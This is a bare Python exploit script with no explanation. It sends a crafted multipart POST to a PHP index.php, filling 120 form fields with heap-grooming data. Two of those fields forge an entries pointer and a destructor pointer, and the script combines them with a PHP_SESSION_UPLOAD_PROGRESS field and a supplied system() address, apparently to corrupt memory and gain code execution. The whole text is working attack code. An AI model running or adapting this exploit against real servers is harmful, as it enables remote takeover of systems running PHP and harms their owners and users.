#!/usr/bin/env python3
import socket,struct,sys
port=int(sys.argv[1]);d=int(sys.argv[2],0);target=int(sys.argv[3],0);system=int(sys.argv[4],0)
fake_entries=d-0x4fe8
fake_dtor=d-0x1fe8
delta=target-(fake_dtor+16);assert delta%16==0
used=delta//16
assert -(1<<63) <= used < (1<<63)
vals=[]
for i in range(120):
 v=bytearray(bytes([0x41+i%26])*8191)
 if i==110:
  v[:16]=b'\0'*16
 if i==111:
  v[:8]=struct.pack('<q',used)
  v[8168:8176]=struct.pack('<Q',fake_entries)
  v[8176:8184]=b'\0'*8
  assert fake_dtor < 1<<56
  v[8184:8191]=struct.pack('<Q',fake_dtor)[:7]
 vals.append(bytes(v))
def part(name,val,fn=None):
 b=b'APACHECF';return b'--'+b+b'\r\nContent-Disposition: form-data; name="'+name+b'"'+((b'; filename="'+fn+b'"')if fn else b'')+b'\r\n\r\n'+val+b'\r\n'
body=b''.join(part(f't{i}'.encode(),v) for i,v in enumerate(vals))
body+=part(b'PHP_SESSION_UPLOAD_PROGRESS',b'x')+part(b'f',b'Z'*32,b'a')+b'--APACHECF--\r\n'
q=f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\nCookie: PHPSESSID=victim\r\nContent-Type: multipart/form-data; boundary=APACHECF\r\nContent-Length: {len(body)}\r\n\r\n'.encode()+body
s=socket.create_connection(('127.0.0.1',port),3);s.sendall(q);s.settimeout(20);out=b''
try:
 while True:
  x=s.recv(65536)
  if not x:break
  out+=x
except OSError:pass
s.close();sys.stdout.buffer.write(out)
print(f'\nD=0x{d:x} FAKE_ENTRIES=0x{fake_entries:x} FAKE_DTOR=0x{fake_dtor:x} USED={used} TARGET=0x{target:x} SYSTEM=0x{system:x}')
